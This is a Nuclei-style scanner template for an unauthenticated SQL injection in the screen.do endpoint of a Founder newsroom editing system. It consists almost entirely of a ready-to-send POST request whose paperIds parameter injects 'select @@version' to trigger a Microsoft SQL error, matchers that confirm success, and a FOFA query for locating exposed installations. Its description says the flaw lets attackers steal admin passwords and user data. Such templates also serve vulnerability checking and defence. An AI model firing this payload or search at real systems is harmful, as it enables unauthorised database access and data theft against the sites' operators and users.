http:
    - matchers:
        - condition: and
          part: body
          type: word
          words:
            - 转换成数据类型 int 时失败
            - Microsoft SQL
        - status:
            - 200
          type: status
      matchers-condition: and
      raw:
        - |
          POST /newsedit/newsplan/screen.do HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
          Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
          Accept-Encoding: gzip, deflate
          Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
          Content-Type: application/x-www-form-urlencoded
          Connection: close

          method=getPaperLayoutList&pageNo=1&pageSize=5&paperDate=2022-11-30&paperIds=123+AND+2675+in+(select+@@version)&terminalType=123
id: fangzheng-screen_do-sql
info:
    author: Superhero
    description: |-
        fofa: body="/newsedit/newsedit/css/login_1.css"
        方正畅享全媒体新闻采编系统 screen.do接口处存在SQL注入漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。
    name: 方正畅享全媒体新闻采编系统 screen.do SQL注入漏洞
    reference:
        - https://mp.weixin.qq.com/s/DTCf9v8j6TtQpEcoKvgh-g?token=1192656222&lang=zh_CN
    severity: high
    tags:
        - 方正畅享全媒体新闻采编系统
        - Perl
